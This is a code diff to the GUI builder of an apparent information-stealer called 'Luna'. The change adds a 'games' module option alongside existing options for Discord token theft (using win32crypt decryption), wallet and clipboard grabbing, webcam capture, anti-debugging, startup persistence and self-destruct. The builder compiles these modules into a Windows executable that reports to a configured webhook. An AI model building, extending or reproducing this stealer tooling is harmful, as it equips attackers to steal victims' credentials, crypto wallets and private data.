@@ -57,7 +57,8 @@ class App(ctk.CTk):
             "anti_spam": False,
             "self_destruct": False,
             "clipboard": False,
-            "webcam": False
+            "webcam": False,
+            "games": False
         }
 
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
@@ -416,7 +417,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             "self_destruct": self.self_destruct,
             "clipboard": self.clipboard,
             "webcam": self.webcam,
-            "wallets": self.wallets
+            "wallets": self.wallets,
+            "games": self.games
         }
 
         for key, checkbox in checkbox_mapping.items():
@@ -566,6 +568,11 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                         code += f.read()
                         code += "\n\n"
 
+                if self.updated_dictionary["games"]:
+                    with open(options+"Games.py", "r", encoding="utf-8") as f:
+                        code += f.read()
+                        code += "\n\n"
+
                 code += """if __name__ == '__main__' and os.name == "nt":
     Luna(__CONFIG__["webhook"])
                 """
@@ -619,7 +626,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "antidebug_vm": ["psutil"],
                 "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt"],
                 "injection": ["psutil"],
-                "systeminfo": ["psutil", "pycountry"]
+                "systeminfo": ["psutil"]
             }
             
             included_modules_pyinstaller = [
@@ -642,7 +649,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "self_destruct": ["subprocess"],
                 "wifi": ["subprocess"],
                 "webcam": ["cv2"],
-                "startup": ["subprocess"]
+                "startup": ["subprocess"],
+                "games": ["subprocess"]
             }
 
             if filetype == "pyinstaller":
